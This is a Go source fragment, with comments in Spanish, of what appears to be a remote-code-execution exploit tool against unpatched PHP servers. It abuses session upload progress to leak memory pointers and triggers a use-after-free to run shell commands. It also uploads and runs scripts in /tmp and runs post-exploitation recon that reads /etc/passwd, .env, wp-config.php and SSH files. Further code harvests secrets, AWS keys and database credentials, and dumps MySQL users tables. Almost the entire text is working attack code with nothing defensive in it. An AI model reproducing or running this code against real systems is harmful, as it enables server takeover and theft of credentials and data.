			out = append(out, p)
		}
	}
	return out
}

var p2sFixed = map[string]string{"8.2": "8.2.35", "8.3": "8.3.36", "8.4": "8.4.27", "8.5": "8.5.12"}

const (
	p2sBlobSize     = 288
	p2sSprayDefault = 149
	p2sFillDefault  = 5120
	p2sChunk        = 96 // bytes de base64 por chunk (cabe en el carrier)
	p2sAlnum        = "abcdefghijklmnopqrstuvwxyz0123456789"
)

func p2sRandStr(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = p2sAlnum[int(b[i])%len(p2sAlnum)]
	}
	return string(b)
}

func p2sMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func p2sShq(s string) string { return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'" }

func randInt63n(n int64) int64 {
	if n <= 1 {
		return 0
	}
	var b [8]byte
	rand.Read(b[:])
	return int64(binary.BigEndian.Uint64(b[:]) % uint64(n))
}

type mpPart struct {
	Name     string
	Filename string
	Data     []byte
}

func buildMultipart(parts []mpPart, boundary string) []byte {
	var buf bytes.Buffer
	for _, p := range parts {
		buf.WriteString("--" + boundary + "\r\n")
		buf.WriteString(`Content-Disposition: form-data; name="` + p.Name + `"`)
		if p.Filename != "" {
			buf.WriteString(`; filename="` + p.Filename + `"`)
			buf.WriteString("\r\nContent-Type: application/octet-stream")
		}
		buf.WriteString("\r\n\r\n")
		buf.Write(p.Data)
		buf.WriteString("\r\n")
	}
	buf.WriteString("--" + boundary + "--\r\n")
	return buf.Bytes()
}

/* ---------- transporte: pool keep-alive + TLS de navegador ---------- */

func p2sTLSConfig(sni string) *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         sni,
		NextProtos:         []string{"http/1.1"}, // hablamos HTTP/1.1 crudo: no ofrecer h2
		MinVersion:         tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
	}
}

type p2sConn struct {
	c  net.Conn
	br *bufio.Reader
}

type p2sPool struct {
	mu    sync.Mutex
	free  []*p2sConn
	open  int
	max   int
	dialf func() (net.Conn, error)
}

func newP2sPool(max int, dialf func() (net.Conn, error)) *p2sPool {
	return &p2sPool{max: max, dialf: dialf}
}

func (p *p2sPool) get(ctx context.Context) (*p2sConn, error) {
	for {
		p.mu.Lock()
		if len(p.free) > 0 {
			c := p.free[len(p.free)-1]
			p.free = p.free[:len(p.free)-1]
			p.mu.Unlock()
			return c, nil
		}
		if p.open < p.max {
			p.open++
			p.mu.Unlock()
			c, err := p.dialf()
			if err != nil {
				p.mu.Lock()
				p.open--
				p.mu.Unlock()
				return nil, err
			}
			return &p2sConn{c: c, br: bufio.NewReaderSize(c, 1<<16)}, nil
		}
		p.mu.Unlock()
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}
		time.Sleep(4 * time.Millisecond)
	}
}

func (p *p2sPool) put(c *p2sConn) {
	p.mu.Lock()
	p.free = append(p.free, c)
	p.mu.Unlock()
}

func (p *p2sPool) drop(c *p2sConn) {
	c.c.Close()
	p.mu.Lock()
	p.open--
	p.mu.Unlock()
}

type p2sResp struct {
	Status int
	Header []byte
	Body   []byte
	Raw    []byte
	Close  bool
}

type p2sTarget struct {
	ctx        context.Context
	hp         string
	hostHeader string
	path       string
	useTLS     bool
	sni        string
	baseHdr    string
	delay      time.Duration
	jitter     bool
	pool       *p2sPool
	requests   int
}

func (t *p2sTarget) pace() {
	if t.delay <= 0 {
		return
	}
	d := t.delay
	if t.jitter {
		j := int64(d) / 3
		d = time.Duration(int64(d) - j + randInt63n(2*j+1))
	}
	select {
	case <-time.After(d):
	case <-t.ctx.Done():
	}
}

func (t *p2sTarget) dial(timeout time.Duration) (net.Conn, error) {
	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(t.ctx, "tcp", t.hp)
	if err != nil {
		return nil, err
	}
	if t.useTLS {
		tc := tls.Client(conn, p2sTLSConfig(t.sni))
		tc.SetDeadline(time.Now().Add(timeout))
		if err := tc.HandshakeContext(t.ctx); err != nil {
			conn.Close()
			return nil, err
		}
		tc.SetDeadline(time.Time{})
		return tc, nil
	}
	return conn, nil
}

func (t *p2sTarget) acquire(timeout time.Duration) (*p2sConn, error) {
	if t.pool != nil {
		return t.pool.get(t.ctx)
	}
	c, err := t.dial(timeout)
	if err != nil {
		return nil, err
	}
	return &p2sConn{c: c, br: bufio.NewReaderSize(c, 1<<16)}, nil
}

func (t *p2sTarget) release(pc *p2sConn, closeIt bool) {
	if t.pool != nil {
		if closeIt {
			t.pool.drop(pc)
		} else {
			t.pool.put(pc)
		}
		return
	}
	pc.c.Close()
}

func p2sReadHead(br *bufio.Reader) ([]byte, int, error) {
	var buf bytes.Buffer
	status, first := 0, true
	for {
		line, err := br.ReadString('\n')
		if line == "" && err != nil {
			return buf.Bytes(), status, err
		}
		buf.WriteString(line)
		if first {
			if f := strings.Fields(line); len(f) >= 2 {
				status, _ = strconv.Atoi(f[1])
			}
			first = false
		}
		if line == "\r\n" || line == "\n" {
			break
		}
		if err != nil {
			break
		}
	}
	return buf.Bytes(), status, nil
}

func p2sReadChunked(br *bufio.Reader) ([]byte, bool) {
	var out bytes.Buffer
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return out.Bytes(), true
		}
		sz := strings.TrimSpace(line)
		if i := strings.IndexByte(sz, ';'); i >= 0 {
			sz = sz[:i]
		}
		n, err := strconv.ParseInt(sz, 16, 64)
		if err != nil {
			return out.Bytes(), true
		}
		if n == 0 {
			for {
				l, err := br.ReadString('\n')
				if err != nil || l == "\r\n" || l == "\n" {
					break
				}
			}
			return out.Bytes(), false
		}
		b := make([]byte, n)
		if _, err := io.ReadFull(br, b); err != nil {
			return out.Bytes(), true
		}
		out.Write(b)
		br.ReadString('\n')
		if out.Len() > 8<<20 {
			return out.Bytes(), false
		}
	}
}

func p2sReadBody(br *bufio.Reader, hdr []byte, status int) ([]byte, bool) {
	if status == 204 || status == 304 || status/100 == 1 {
		return nil, false
	}
	low := strings.ToLower(string(hdr))
	if i := strings.Index(low, "transfer-encoding:"); i >= 0 && strings.Contains(low[i:], "chunked") {
		return p2sReadChunked(br)
	}
	if i := strings.Index(low, "content-length:"); i >= 0 {
		rest := low[i+len("content-length:"):]
		if j := strings.IndexAny(rest, "\r\n"); j >= 0 {
			if n, err := strconv.Atoi(strings.TrimSpace(rest[:j])); err == nil && n >= 0 {
				body := make([]byte, n)
				if _, err := io.ReadFull(br, body); err != nil {
					return body, true
				}
				return body, strings.Contains(low, "connection: close")
			}
		}
	}
	body, _ := io.ReadAll(io.LimitReader(br, 8<<20))
	return body, true
}

func p2sReadResp(br *bufio.Reader) *p2sResp {
	for {
		hdr, status, err := p2sReadHead(br)
		if err != nil && len(hdr) == 0 {
			return nil
		}
		if status >= 100 && status < 200 {
			continue
		}
		body, closeIt := p2sReadBody(br, hdr, status)
		return &p2sResp{Status: status, Header: hdr, Body: body, Close: closeIt}
	}
}

func p2sHeaderMap(raw []byte) map[string]string {
	m := map[string]string{}
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimRight(line, "\r")
		if i := strings.Index(line, ":"); i > 0 {
			k := strings.ToLower(strings.TrimSpace(line[:i]))
			if _, ok := m[k]; !ok {
				m[k] = strings.TrimSpace(line[i+1:])
			}
		}
	}
	return m
}

// do ejecuta una petición (con o sin pool) y devuelve la respuesta; reintenta una vez
// sobre conexión nueva si la reutilizada estaba muerta.
func (t *p2sTarget) do(method, extraHdr string, body []byte, ctype string, timeout time.Duration) *p2sResp {
	for attempt := 0; attempt < 2; attempt++ {
		if t.ctx.Err() != nil {
			return nil
		}
		pc, err := t.acquire(timeout)
		if err != nil {
			continue
		}
		t.requests++
		pc.c.SetDeadline(time.Now().Add(timeout))
		var hb bytes.Buffer
		fmt.Fprintf(&hb, "%s %s HTTP/1.1\r\nHost: %s\r\n%s", method, t.path, t.hostHeader, t.baseHdr)
		if extraHdr != "" {
			hb.WriteString(extraHdr)
		}
		if ctype != "" {
			hb.WriteString("Content-Type: " + ctype + "\r\n")
		}
		if body != nil {
			fmt.Fprintf(&hb, "Content-Length: %d\r\n", len(body))
		}
		if t.pool != nil {
			hb.WriteString("Connection: keep-alive\r\n")
		} else {
			hb.WriteString("Connection: close\r\n")
		}
		hb.WriteString("\r\n")

		ok := true
		if _, err := pc.c.Write(hb.Bytes()); err != nil {
			ok = false
		}
		for off := 0; ok && off < len(body); {
			end := off + 262144
			if end > len(body) {
				end = len(body)
			}
			if _, err := pc.c.Write(body[off:end]); err != nil {
				ok = false
				break
			}
			off = end
		}
		if !ok {
			t.release(pc, true)
			continue
		}
		pc.c.SetDeadline(time.Now().Add(timeout)) // el reloj de lectura no lo come la escritura
		resp := p2sReadResp(pc.br)
		if resp == nil {
			t.release(pc, true)
			continue
		}
		resp.Raw = append(append([]byte{}, resp.Header...), resp.Body...)
		t.release(pc, !(t.pool != nil && !resp.Close))
		t.pace()
		return resp
	}
	return nil
}

func (t *p2sTarget) post(body []byte, boundary, extraHdr string, timeout time.Duration) []byte {
	r := t.do("POST", extraHdr, body, "multipart/form-data; boundary="+boundary, timeout)
	if r == nil {
		return nil
	}
	return r.Raw
}

func (t *p2sTarget) get(extraHdr string, timeout time.Duration) (int, []byte) {
	r := t.do("GET", extraHdr, nil, "", timeout)
	if r == nil {
		return 0, nil
	}
	return r.Status, r.Body
}

/* ---------- datos ---------- */

func p2sUnquote(s string) []byte {
	hv := func(c byte) (byte, bool) {
		switch {
		case c >= '0' && c <= '9':
			return c - '0', true
		case c >= 'a' && c <= 'f':
			return c - 'a' + 10, true
		case c >= 'A' && c <= 'F':
			return c - 'A' + 10, true
		}
		return 0, false
	}
	out := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		if s[i] == '%' && i+2 < len(s) {
			if hi, ok1 := hv(s[i+1]); ok1 {
				if lo, ok2 := hv(s[i+2]); ok2 {
					out = append(out, hi<<4|lo)
					i += 2
					continue
				}
			}
		}
		out = append(out, s[i])
	}
	return out
}

var rePHPSESSID = regexp.MustCompile(`(?i)Set-Cookie:\s*PHPSESSID=([^\s;]+)`)

func p2sParseLeak(raw []byte) []byte {
	if m := rePHPSESSID.FindSubmatch(raw); m != nil {
		return p2sUnquote(string(m[1]))
	}
	return nil
}

func p2sPrintable(b []byte) string {
	out := make([]byte, 0, len(b))
	for _, c := range b {
		switch {
		case c >= 0x20 && c < 0x7f, c == '\n', c == '\t':
			out = append(out, c)
		default:
			out = append(out, '.')
		}
	}
	return string(out)
}

func p2sExtractBetween(body []byte, a, b string) (string, bool) {
	s := string(body)
	i := strings.Index(s, a)
	if i < 0 {
		return "", false
	}
	rest := s[i+len(a):]
	j := strings.Index(rest, b)
	if j < 0 {
		return "", false
	}
	return strings.TrimSpace(rest[:j]), true
}

func p2sAcceptOutput(body []byte) bool {
	s := strings.TrimSpace(string(body))
	if s == "" || len(s) > 262144 {
		return false
	}
	low := strings.ToLower(s)
	return !strings.Contains(low, "<!doctype") && !strings.Contains(low, "<html")
}

func p2sLooksLikeOutput(body []byte, cmd string) bool {
	s := string(body)
	if len(s) == 0 || len(s) > 4096 {
		return false
	}
	low := strings.ToLower(s)
	if strings.Contains(low, "<!doctype") || strings.Contains(low, "<html") {
		return false
	}
	for _, h := range []string{"uid=", "root", "www-data", "linux ", "pretty_name", "total ", "bin/bash", "/bin/sh", "nobody", "apache", "nginx", "daemon", "gid="} {
		if strings.Contains(low, h) {
			return true
		}
	}
	return strings.Count(s, "\n") >= 1 && !strings.Contains(s, "<")
}

func p2sParseHex(v any) (uint64, bool) {
	switch x := v.(type) {
	case float64:
		return uint64(x), true
	case string:
		x = strings.TrimSpace(x)
		if x == "" {
			return 0, false
		}
		n, err := strconv.ParseUint(strings.TrimPrefix(strings.ToLower(x), "0x"), 16, 64)
		if err == nil {
			return n, true
		}
	}
	return 0, false
}

/* ---------- secretos y credenciales ---------- */

var p2sSecretPatterns = []struct {
	Name string
	Re   *regexp.Regexp
}{
	{"AWS Access Key", regexp.MustCompile(`AKIA[0-9A-Z]{16}`)},
	{"JWT", regexp.MustCompile(`eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}`)},
	{"Clave privada", regexp.MustCompile(`-----BEGIN [A-Z ]*PRIVATE KEY-----`)},
	{"Password", regexp.MustCompile(`(?i)(?:password|passwd|pwd)["']?\s*[:=]\s*["']?[^\s"'&;]{3,}`)},
	{"Token/API key", regexp.MustCompile(`(?i)(?:token|secret|api[_-]?key|apikey)["']?\s*[:=]\s*["']?[A-Za-z0-9_\-\.]{8,}`)},
	{"URL de BD", regexp.MustCompile(`(?i)(?:mysql|postgres|postgresql|mongodb|redis|amqp)://[^\s"']{6,}`)},
	{"Email", regexp.MustCompile(`[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}`)},
	{"PHPSESSID", regexp.MustCompile(`PHPSESSID=[A-Za-z0-9]{10,}`)},
}

func p2sExtractSecrets(data []byte) []map[string]string {
	if len(data) == 0 {
		return nil
	}
	s := string(data)
	seen := map[string]bool{}
	var out []map[string]string
	for _, p := range p2sSecretPatterns {
		for _, idx := range p.Re.FindAllStringIndex(s, 60) {
			v := strings.TrimSpace(s[idx[0]:idx[1]])
			if len(v) < 4 || seen[v] {
				continue
			}
			seen[v] = true
			lo := idx[0] - 36
			if lo < 0 {
				lo = 0
			}
			hi := idx[1] + 36
			if hi > len(s) {
				hi = len(s)
			}
			out = append(out, map[string]string{"kind": p.Name, "value": v, "context": p2sPrintable([]byte(s[lo:hi]))})
			if len(out) >= 150 {
				return out
			}
		}
	}
	return out
}

var p2sDBCreds = []struct {
	Field string
	Re    *regexp.Regexp
}{
	{"usuario", regexp.MustCompile(`(?i)(?:DB_USER(?:NAME)?|MYSQL_USER|DATABASE_USER)\s*['"]?\s*[:=,]{1,2}\s*['"]?([^\s'"&;,)]{1,64})`)},
	{"password", regexp.MustCompile(`(?i)(?:DB_PASSWORD|DB_PASS(?:WORD)?|MYSQL_PASSWORD|DATABASE_PASSWORD)\s*['"]?\s*[:=,]{1,2}\s*['"]?([^\s'"&;,)]{1,64})`)},
	{"base de datos", regexp.MustCompile(`(?i)(?:DB_NAME|DB_DATABASE|MYSQL_DATABASE|DATABASE_NAME)\s*['"]?\s*[:=,]{1,2}\s*['"]?([^\s'"&;,)]{1,64})`)},
	{"host", regexp.MustCompile(`(?i)(?:DB_HOST|DB_SERVER|MYSQL_HOST|DATABASE_HOST)\s*['"]?\s*[:=,]{1,2}\s*['"]?([^\s'"&;,)]{1,64})`)},
	{"DSN", regexp.MustCompile(`(?i)(?:mysql|pgsql|postgres|postgresql)://[^\s"'&;)]{6,120}`)},
}

func p2sExtractCreds(text string) map[string]string {
	out := map[string]string{}
	for _, c := range p2sDBCreds {
		if m := c.Re.FindStringSubmatch(text); m != nil {
			if v := strings.Trim(m[len(m)-1], `'"`); v != "" {
				out[c.Field] = v
			}
		}
	}
	return out
}

/* ---------- fingerprint / versión / SAPI ---------- */

func p2sFingerprintT(t *p2sTarget) (string, []string, string) {
	r := t.do("GET", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n", nil, "", 12*time.Second)
	if r == nil {
		return "", nil, "desconocido"
	}
	h := p2sHeaderMap(r.Header)
	var markers []string
	ver := ""
	rePHP := regexp.MustCompile(`(?i)php[/ ]v?(\d+\.\d+(?:\.\d+)?)`)
	for _, k := range []string{"x-powered-by", "server", "x-php-version"} {
		if v := h[k]; v != "" {
			markers = append(markers, k+": "+v)
			if m := rePHP.FindStringSubmatch(v); m != nil && ver == "" {
				ver = m[1]
			}
		}
	}
	if strings.Contains(strings.ToLower(h["set-cookie"]), "phpsessid") {
		markers = append(markers, "Set-Cookie: PHPSESSID presente")
	}
	return ver, markers, p2sSAPI(markers)
}

func p2sCmpVer(a, b string) int {
	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
	for i := 0; i < len(pa) || i < len(pb); i++ {
		var x, y int
		if i < len(pa) {
			x, _ = strconv.Atoi(regexp.MustCompile(`^\d+`).FindString(pa[i]))
		}
		if i < len(pb) {
			y, _ = strconv.Atoi(regexp.MustCompile(`^\d+`).FindString(pb[i]))
		}
		if x != y {
			if x < y {
				return -1
			}
			return 1
		}
	}
	return 0
}

func p2sVulnerable(v string) (bool, string) {
	v = regexp.MustCompile(`(?i)^php[/ ]?`).ReplaceAllString(strings.TrimSpace(v), "")
	mm := regexp.MustCompile(`^(\d+)\.(\d+)(?:\.(\d+))?`).FindStringSubmatch(v)
	if mm == nil {
		return true, "versión desconocida → se asume vulnerable"
	}
	branch := mm[1] + "." + mm[2]
	fixed, ok := p2sFixed[branch]
	if !ok {
		return true, "rama PHP " + branch + " sin parche oficial (EOL) → vulnerable"
	}
	if p2sCmpVer(v, fixed) < 0 {
		return true, "PHP " + v + " < " + fixed
	}
	return false, "PHP " + v + " ≥ " + fixed
}

func p2sSAPI(markers []string) string {
	for _, m := range markers {
		l := strings.ToLower(m)
		switch {
		case strings.Contains(l, "apache"):
			return "Apache"
		case strings.Contains(l, "nginx"):
			return "nginx"
		case strings.Contains(l, "fpm"):
			return "php-fpm"
		}
	}
	return "desconocido"
}

/* ---------- fases ---------- */

func p2sRotate(t *p2sTarget, n int) {
	boundary := p2sRandStr(9)
	pref := p2sRandStr(1)
	parts := []mpPart{{Name: "PHP_SESSION_UPLOAD_PROGRESS", Data: []byte("rotate")}}
	for i := 0; i < n; i++ {
		parts = append(parts, mpPart{Name: pref + strconv.Itoa(i), Data: bytes.Repeat([]byte("X"), 1024)})
	}
	parts = append(parts, mpPart{Name: "file", Filename: "x", Data: []byte("x")})
	t.post(buildMultipart(parts, boundary), boundary, "", 8*time.Second)
}

func p2sLeakChunk(t *p2sTarget, p p2sProfile, sessid string) (uint64, []byte) {
	boundary := p2sRandStr(8)
	pref := p2sRandStr(1)
	parts := []mpPart{{Name: "PHP_SESSION_UPLOAD_PROGRESS", Data: []byte("x")}}
	for i := 0; i < p.Stage1N; i++ {
		parts = append(parts, mpPart{Name: fmt.Sprintf("%s%04d", pref, i), Data: []byte("vvvvvvvv")})
	}
	parts = append(parts, mpPart{Name: "file", Filename: "f", Data: []byte("x")})
	raw := t.post(buildMultipart(parts, boundary), boundary, "Cookie: PHPSESSID="+sessid+"\r\n", 15*time.Second)
	leak := p2sParseLeak(raw)
	if len(leak) < 16 {
		return 0, leak
	}
	if chunk := binary.LittleEndian.Uint64(leak[:8]) &^ 0x1FFFFF; chunk > 0x700000000000 {
		return chunk, leak
	}
	return 0, leak
}

func p2sLeakLibphp(t *p2sTarget, p p2sProfile, sessid string) (uint64, []byte) {
	boundary := p2sRandStr(8)
	pref := p2sRandStr(1)
	parts := []mpPart{{Name: "PHP_SESSION_UPLOAD_PROGRESS", Data: []byte("x")}}
	nTotal := 998
	for i := 0; i < nTotal; i++ {
		if i == p.Stage2T {
			for j := 0; j < p.Stage2V; j++ {
				parts = append(parts, mpPart{Name: fmt.Sprintf("%s%04d[%d]", pref, i, j), Data: []byte("wwwwwwww")})
			}
		} else {
			parts = append(parts, mpPart{Name: fmt.Sprintf("%s%04d", pref, i), Data: []byte("wwwwwwww")})
		}
	}
	parts = append(parts, mpPart{Name: "file", Filename: "f", Data: []byte("x")})
	raw := t.post(buildMultipart(parts, boundary), boundary, "Cookie: PHPSESSID="+sessid+"\r\n", 15*time.Second)
	leak := p2sParseLeak(raw)
	if len(leak) < 16 {
		return 0, leak
	}
	// devuelve el puntero CRUDO a ZVAL_PTR_DTOR (independiente del perfil)
	return binary.LittleEndian.Uint64(leak[8:16]), leak
}

func p2sForgeHT(htdata, zif uint64, cmd string) []byte {
	ht := make([]byte, 56)
	binary.LittleEndian.PutUint32(ht[4:], 1)
	binary.LittleEndian.PutUint32(ht[8:], 0xFFFFFFFF)
	binary.LittleEndian.PutUint64(ht[32:], zif)
	binary.LittleEndian.PutUint64(ht[40:], htdata+56)
	cmdEnc := append([]byte(cmd), 0)
	zstr := make([]byte, 32+len(cmdEnc))
	binary.LittleEndian.PutUint64(zstr[0:], 1)
	binary.LittleEndian.PutUint64(zstr[16:], uint64(len(cmd)))
	copy(zstr[24:], cmdEnc)
	blob := append(ht, zstr...)
	if len(blob) < p2sBlobSize {
		blob = append(blob, make([]byte, p2sBlobSize-len(blob))...)
	}
	return blob[:p2sBlobSize]
}

func p2sBuildUAFBody(boundary string, blob []byte, sprayN, fillSize int) ([]byte, []byte) {
	pref := p2sRandStr(1)
	var p1 bytes.Buffer
	p1.WriteString("--" + boundary + "\r\n")
	p1.WriteString("Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n")
	p1.WriteString("php2shell\r\n")
	for i := 0; i < sprayN; i++ {
		p1.WriteString("--" + boundary + "\r\n")
		p1.WriteString("Content-Disposition: form-data; name=\"" + pref + "[]\"\r\n\r\n")
		p1.Write(blob)
		p1.WriteString("\r\n")
	}
	p1.WriteString("--" + boundary + "\r\n")
	p1.WriteString("Content-Disposition: form-data; name=\"file\"; filename=\"up.bin\"\r\n")
	p1.WriteString("Content-Type: application/octet-stream\r\n\r\n")
	phase1 := append(p1.Bytes(), bytes.Repeat([]byte("A"), fillSize)...)
	phase2 := append(bytes.Repeat([]byte("B"), 4096), []byte("\r\n--"+boundary+"--\r\n")...)
	return phase1, phase2
}

func p2sUAFAttempt(t *p2sTarget, sessid string, htdata, zif uint64, cmd string, stall float64, sprayN, fillSize int) (int, []byte) {
	boundary := p2sRandStr(24)
	phase1, phase2 := p2sBuildUAFBody(boundary, p2sForgeHT(htdata, zif, cmd), sprayN, fillSize)
	total := len(phase1) + len(phase2)

	pc, err := t.acquire(20 * time.Second)
	if err != nil {
		return 0, nil
	}
	t.requests++
	pc.c.SetDeadline(time.Now().Add(30 * time.Second))
	var hb bytes.Buffer
	fmt.Fprintf(&hb, "POST %s HTTP/1.1\r\nHost: %s\r\n%sCookie: PHPSESSID=%s\r\nContent-Type: multipart/form-data; boundary=%s\r\nContent-Length: %d\r\n",
		t.path, t.hostHeader, t.baseHdr, sessid, boundary, total)
	if t.pool != nil {
		hb.WriteString("Connection: keep-alive\r\n")
	} else {
		hb.WriteString("Connection: close\r\n")
	}
	hb.WriteString("\r\n")
	pc.c.Write(hb.Bytes())
	pc.c.Write(phase1)

	var wg sync.WaitGroup
	wg.Add(1)
	go func() { defer wg.Done(); t.get("Cookie: PHPSESSID="+sessid+"\r\n", 15*time.Second) }()
	time.Sleep(time.Duration(stall * float64(time.Second)))
	pc.c.Write(phase2)

	pc.c.SetDeadline(time.Now().Add(20 * time.Second))
	resp := p2sReadResp(pc.br)
	wg.Wait()

	status, raw := 0, []byte(nil)
	if resp != nil {
		status = resp.Status
		raw = append(append([]byte{}, resp.Header...), resp.Body...)
		t.release(pc, t.pool == nil || resp.Close)
	} else {
		t.release(pc, true)
	}
	t.pace()
	return status, raw
}

/* ---------- ejecución de comandos ---------- */

func p2sRunCmd(t *p2sTarget, sessid string, htdata, zif uint64, cmd string, attempts int, strict bool) (bool, string) {
	nonce := p2sRandStr(4)
	a, b := "P"+nonce+"A", "P"+nonce+"B"
	wrapped := "echo " + a + ";" + cmd + ";echo " + b
	for i := 0; i < attempts; i++ {
		if t.ctx.Err() != nil {
			break
		}
		_, rb := p2sUAFAttempt(t, sessid, htdata, zif, wrapped, 0.35, p2sSprayDefault, p2sFillDefault)
		if out, ok := p2sExtractBetween(rb, a, b); ok {
			return true, out
		}
		if !strict && p2sAcceptOutput(rb) {
			return true, strings.TrimSpace(string(rb))
		}
	}
	return false, ""
}

// p2sUploadAndRun sube un script a /tmp en chunks base64 y lo ejecuta con sh:
// permite comandos de longitud ilimitada, saltándose el límite del carrier.
func p2sUploadAndRun(t *p2sTarget, sessid string, htdata, zif uint64, script string) (bool, string) {
	nonce := p2sRandStr(6)
	remote := "/tmp/.p2s_" + nonce
	b64 := base64.StdEncoding.EncodeToString([]byte(script))
	first := true
	for off := 0; off < len(b64); off += p2sChunk {
		end := p2sMin(off+p2sChunk, len(b64))
		op := ">>"
		if first {
			op = ">"
			first = false
		}
		if ok, _ := p2sRunCmd(t, sessid, htdata, zif, "echo '"+b64[off:end]+"'"+op+remote+".b64", 2, false); !ok {
			return false, ""
		}
	}
	run := "base64 -d " + remote + ".b64>" + remote + ";sh " + remote + ";rm -f " + remote + " " + remote + ".b64"
	return p2sRunCmd(t, sessid, htdata, zif, run, 3, false)
}

// p2sRunSmart ejecuta inline si el comando cabe; si no, lo sube como script.
func p2sRunSmart(t *p2sTarget, sessid string, htdata, zif uint64, cmd string, attempts int) (bool, string) {
	if len(cmd) <= 150 {
		return p2sRunCmd(t, sessid, htdata, zif, cmd, attempts, false)
	}
	return p2sUploadAndRun(t, sessid, htdata, zif, cmd+"\n")
}

// p2sConfirmLayout prueba los perfiles y valida con centinela «uid=».
func p2sConfirmLayout(t *p2sTarget, sessid string, chunk, dtorAbs uint64, order []p2sProfile, attempts int) (p2sProfile, uint64, uint64, bool) {
	for _, p := range order {
		if p.DtorOffset > dtorAbs {
			continue
		}
		libphp := dtorAbs - p.DtorOffset
		if libphp <= 0x700000000000 || libphp&0xFFF != 0 {
			continue
		}
		htdata, zif := chunk+p.HtdataOffset, libphp+p.ZifOffset
		if ok, out := p2sRunCmd(t, sessid, htdata, zif, "id", attempts, true); ok && strings.Contains(out, "uid=") {
			return p, htdata, zif, true
		}
	}
	return p2sProfile{}, 0, 0, false
}

/* ---------- post-explotación ---------- */

const p2sReconScript = `echo "=== IDENTIDAD ==="; id 2>&1; uname -a 2>&1; hostname 2>&1
echo "=== OS ==="; cat /etc/os-release 2>&1
echo "=== CWD ==="; pwd 2>&1
echo "=== LISTADO ==="; ls -la 2>&1; echo "--- padre ---"; ls -la .. 2>&1
echo "=== ENTORNO ==="; env 2>&1 | sort
echo "=== USUARIOS ==="; cat /etc/passwd 2>&1
echo "=== CONFIG WEBROOT ==="
for f in .env ../.env ../../.env wp-config.php ../wp-config.php config.php configuration.php settings.php inc/config.php app/config.php .htaccess composer.json; do
  [ -f "$f" ] && { echo "--- $f ---"; cat "$f" 2>&1; }
done
echo "=== BUSQUEDA CONFIG ==="
find / -maxdepth 5 \( -name '.env' -o -name 'wp-config.php' -o -name 'config.php' \) 2>/dev/null | head -40
echo "=== RED ==="
(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -40
echo "=== HOSTS ==="; cat /etc/hosts 2>&1
echo "=== CRON/SSH ==="; ls -la ~/.ssh 2>/dev/null; crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null
echo "=== BINARIOS ==="; for b in mysql mysqldump psql python3 perl curl wget nc tar gcc; do command -v $b >/dev/null 2>&1 && echo "$b: $(command -v $b)"; done
echo "=== FIN ==="
`

func p2sBuildDBScript(creds map[string]string) string {
	user, pass, db, host := creds["usuario"], creds["password"], creds["base de datos"], creds["host"]
	dsn := creds["DSN"]
	var b strings.Builder
	args := ""
	target := ""
	if user != "" || pass != "" {
		if pass != "" {
			b.WriteString("export MYSQL_PWD=" + p2sShq(pass) + "\n")
		}
		if user != "" {
			args += " -u" + p2sShq(user)
		}
		if host != "" && host != "localhost" && host != "127.0.0.1" {
			args += " -h" + p2sShq(host)
		}
		if db != "" {
			target = " " + p2sShq(db)
		}
	} else if dsn != "" {
		target = " " + p2sShq(dsn)
	} else {
		return ""
	}
	b.WriteString("echo '=== VERSION ==='; mysql " + args + " -e 'select version()' 2>&1\n")
	b.WriteString("echo '=== TABLAS ==='; mysql " + args + target + " -e 'show tables' 2>&1\n")
	b.WriteString("echo '=== USUARIOS (muestra) ==='; mysql " + args + target + " -e 'select * from users limit 30' 2>&1\n")
	b.WriteString("echo '=== DUMP (mysqldump) ==='; command -v mysqldump >/dev/null 2>&1 && mysqldump --no-tablespaces " + args + target + " 2>/dev/null | head -400\n")
	b.WriteString("echo '=== FIN DB ==='\n")
	return b.String()
}

var p2sReconCmds = []struct{ Name, Cmd string }{
	{"identidad / sistema", "id;uname -a;hostname;cat /etc/os-release"},
	{"directorio actual", "pwd;ls -la;ls -la .."},
	{"usuarios locales", "cat /etc/passwd"},
	{"variables de entorno", "env"},
	{"config en webroot", "cat .env 2>/dev/null;cat wp-config.php 2>/dev/null;cat config.php 2>/dev/null;cat configuration.php 2>/dev/null"},
	{"config extendida", "cat ../.env 2>/dev/null;cat settings.php 2>/dev/null;cat .htaccess 2>/dev/null;cat composer.json 2>/dev/null"},
	{"buscar .env/configs", "find / -maxdepth 5 -name .env 2>/dev/null|head -20"},
	{"red / hosts", "ss -tlnp 2>/dev/null;cat /etc/hosts"},
}

